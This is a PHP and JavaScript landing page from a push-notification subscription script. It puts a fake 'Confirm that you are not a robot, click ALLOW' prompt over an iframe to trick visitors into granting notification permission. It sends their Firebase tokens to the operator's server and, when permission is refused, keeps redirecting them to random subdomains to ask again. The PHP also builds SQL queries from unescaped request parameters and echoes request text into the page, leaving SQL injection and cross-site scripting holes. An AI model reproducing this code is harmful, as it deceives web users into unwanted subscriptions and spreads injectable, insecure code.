<?php
// 3xpush Script - Push Subscription Management System 
// Copyright 2020 Evgeniy Orel
// Site: https://script.3xpush.com/
// Email: script@3xpush.com
// Telegram: @Evgenfalcon
//
// ======================================================================
// This file is part of 3xpush Script.
//
// 3xpush Script is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// 3xpush Script is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with 3xpush Script.  If not, see <https://www.gnu.org/licenses/>.
//======================================================================

ini_set('display_errors',false);
error_reporting(0);

header('Content-Type: text/html; charset=utf-8');
require_once("include/mysql.php");
require_once("include/func.php");
require_once("include/info.php");

include_once 'include/devicedetector/spyc/Spyc.php';
include_once 'include/devicedetector/autoload.php';

use DeviceDetector\DeviceDetector;

$locale = get_lang();
$settings = settings();
$text = text_filter($_GET['text']);
$sid = intval($_GET['sid']);
$subid = text_filter($_GET['subid']);
$price = text_filter($_GET['price']);
if (!$sid) exit;
$sites = sites("AND id='$sid'");
$host = get_host();

if ($sites[$sid]['iframe_options']) {
$iframe_options = json_decode($sites[$sid]['iframe_options'], true);
if ($iframe_options['text'] && $iframe_options['nogettext']==1) $text = $iframe_options['text'];
}
$agent = getenv("HTTP_USER_AGENT");

$deviceDetector = new DeviceDetector($agent);
$deviceDetector->parse();

$br = $deviceDetector->getClient();

list($brid) = $db->sql_fetchrow($db->sql_query("SELECT id FROM  browsers WHERE `key` = '".$br['name']."'"));

$db->sql_query('INSERT INTO daystat (date, sid, subid, land_views, traf_cost)
        VALUES (CURRENT_DATE(), ' . $sid . ', "'.$subid.'", 1, "'.$price.'")
         ON DUPLICATE KEY UPDATE land_views=land_views+1, traf_cost=traf_cost+'.$price.'');

$db->sql_query('INSERT INTO browser_stat (date, browser_id, sid, land_views, traf_cost)
        VALUES (CURRENT_DATE(), "'.$brid.'",  ' . $sid . ', 1, "'.$price.'")
         ON DUPLICATE KEY UPDATE land_views=land_views+1, traf_cost=traf_cost+'.$price.'');
                  
if (!$text) {
if ($locale == "ru") {
        $text = "<div class=text><img src=img/warn.png border=0><br>Подтвердите, что вы не робот, нажмите<br>  <div class=allow>РАЗРЕШИТЬ</div></div>";
} else {
        $text = "<div class=text><img src=img/warn.png border=0><br>Confirm that you are not a robot, click <div class=allow>ALLOW</div></div>";
}
} else {
        $text = "<div class=text><img src=img/warn.png border=0><br>".$text."</div>";
}



?>
<style>
.text {display: block;
text-align: center;
margin-top: 15%;
    font-family: tahoma;
}
    .allow {
        display: inline-block;
        background-color: #ececec;
        color: #545454;
        padding-right: 10px;
        padding-left: 10px;
        font-weight: normal;
        border-radius: 3px;
        font-size: 26px;
    }

    .iframe, .top-layer {
        position: fixed;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        width: 100%;
        height: 100%;
        border: none;
        margin: 0;
        padding: 0;
        overflow: hidden;
    }

    .top-layer {
        position: absolute;
        opacity: 0.85;
        z-index: 100;
        background-color: black;
    }

    .title {
        color: white;
        text-align: center;
        letter-spacing: 2px;
        padding: 40px;
        opacity: 1
    }
</style>

<iframe src="" class="iframe"></iframe>
<div class="top-layer">
    <h2 class="title">
        <?php echo $text; ?>
    </h2>
</div>

<script src="https://www.gstatic.com/firebasejs/5.2.0/firebase.js"></script>
<script>

    function transferHashToEnd() {

        var hashItems = window.location.href.split('#');

        if (hashItems[1].indexOf('&') === -1) {
            return false;
        }

        var indexStart = hashItems[1].indexOf('&');
        hashItems[0] += hashItems[1].slice(indexStart);
        hashItems[1] = hashItems[1].slice(0, indexStart);

        document.location.href = hashItems[0] + '#' + hashItems[1];
    }

    transferHashToEnd();

    function getCookie(name) {
        let matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : undefined;
    }

    function setCookie(name, value, options) {
        options = options || {};

        let expires = options.expires;

        if (typeof expires === "number" && expires) {
            var d = new Date();
            d.setTime(d.getTime() + expires * 1000);
            expires = options.expires = d;
        }
        if (expires && expires.toUTCString) {
            options.expires = expires.toUTCString();
        }

        value = encodeURIComponent(value);

        let updatedCookie = name + "=" + value;

        for (let propName in options) {
            updatedCookie += "; " + propName;
            let propValue = options[propName];
            if (propValue !== true) {
                updatedCookie += "=" + propValue;
            }
        }

        document.cookie = updatedCookie;
    }

    let hash = window.location.hash.slice(1);
    let items = hash.split('&');

    function getParam(paramName) {

        var url = new URL(document.location.href);
        var param = url.searchParams.get(paramName);

        return param;

        // let paramIndex = hash.indexOf(paramName),
        //     paramStr;
        //
        // if (hash.indexOf('&', paramIndex) !== -1) {
        //     paramStr = hash.slice(paramIndex, hash.indexOf('&', paramIndex));
        // } else {
        //     paramStr = hash.slice(paramIndex);
        // }
        //
        // let param = paramStr.slice(paramStr.indexOf('=') + 1);
        //
        // return param;
    }

    let repeatString = window.location.search.match(/r=\d+/g);

    if (repeatString) {
        var repeat = repeatString[0].slice(repeatString[0].indexOf('=') + 1);
    }

    let noredirectStr = window.location.search.match(/noredirect=\d+/g);

    if (noredirectStr) {
        var noredirect = noredirectStr[0].slice(noredirectStr[0].indexOf('=') + 1);
        console.log(noredirect);
    }

    let repeatCount = getCookie('repeatCountFrame');


    let psx_host = '<?php echo $host; ?>',
        psx_site_id = getParam('sid'),
        psx_sub_id = getParam('subid'),
        psx_tag = getParam('tag'),
        psx_postback;
        
        if (!repeatCount || repeatCount === "NaN") {
        setCookie('repeatCountFrame', '0', {domain: '.'+psx_host});
    }
    

    let linkItems = items.filter(function (item) {
        return item.indexOf('sid') === -1 && item.indexOf('tag') === -1 && item.indexOf('subid') === -1;
    });

    var link = '';
    linkItems.forEach(function (item, i) {
        if (i === 0) {
            link += item;
        } else {
            link += '&' + item;
        }
    });

    function randomInteger(min, max) {
        var rand = min + Math.random() * (max + 1 - min);
        rand = Math.floor(rand);
        return rand;
    }

    let frame = document.querySelector('.iframe');
    frame.setAttribute('src', link);

    function subscribe() {
        messaging.requestPermission()
            .then(function () {
                messaging.getToken()
                    .then(function (currentToken) {
                        console.log(currentToken);

                        if (currentToken) {
                            sendTokenToServer(currentToken);

                            if (+repeat <= +repeatCount || !repeat) {
                                setTimeout(function () {
                                    window.location = link;
                                }, 1000);
                            } else {
                                repeatCount = getCookie('repeatCountFrame');
                                repeatCount++;

                                setCookie('repeatCountFrame', String(repeatCount), {domain: '.'+psx_host});

                                window.location.host = randomInteger(1, 1000000) + '.'+psx_host;
                            }


                        } else {
                            console.warn('cant get token.');
                            setTokenSentToServer(false);
                        }
                    }).catch(function (err) {
                    console.warn('getting token error.', err);
                    setTokenSentToServer(false);
                });
            })
            .catch(function (err) {
                console.warn('not allow to show message.', err);

                var xhr = new XMLHttpRequest();
                xhr.open("GET", 'https://' + psx_host + '/req.php?type=7&sid=' + psx_site_id + '&sub=' + psx_sub_id, true);
                xhr.send();

                if (noredirect) {
                    window.location = link;
                    return;
                }

                window.location.host = randomInteger(1, 1000000) +'.'+ psx_host;
            });
    }

    function sendTokenToServer(currentToken) {
        if (!isTokenSentToServer(currentToken)) {

            httpRequest = new XMLHttpRequest();
            httpRequest.open('GET', 'https://' + psx_host + '/create.php?type=1&sid=' + psx_site_id + '&sub=' + psx_sub_id + '&tag='+psx_tag+'&t=' + currentToken, true);
            httpRequest.send();

            setTokenSentToServer(currentToken);
        } else {
            console.log('token already sended.');
        }
    }

    function isTokenSentToServer(currentToken) {
        return window.localStorage.getItem('sentFirebaseMessagingToken') == currentToken;
    }

    function setTokenSentToServer(currentToken) {
        window.localStorage.setItem(
            'sentFirebaseMessagingToken',
            currentToken ? currentToken : ''
        );
    }

    function init() {
<?php echo $settings['firebase_conf']; ?>

        try {

            firebase.initializeApp(config);

            messaging = firebase.messaging();

            if (Notification.permission !== 'granted') {
                console.log('try to subscribe');


                var xhr = new XMLHttpRequest();

                xhr.open("GET", 'https://' + psx_host + '/req.php?type=1&sid=' + psx_site_id + '&sub=' + psx_sub_id, true);

                xhr.onreadystatechange = function () {
                    if (this.readyState == 4) {
                            localStorage.clear();
                            if (!localStorage.getItem('sentFirebaseMessagingToken')) {
                                subscribe();
                            }

                        ;

                        var x = 0;
                    }
                };

                xhr.send();

            } else {
                window.location = link;
            }

        } catch (e) {
            console.log('cant init ' + e);
            setTimeout(init, 1000);
        }
    }

    if ('Notification' in window) {
        if (Notification.permission === 'granted') {
            setTimeout(function () {
                window.location = link;
            }, 1000);
        }

        init();
    }


</script>

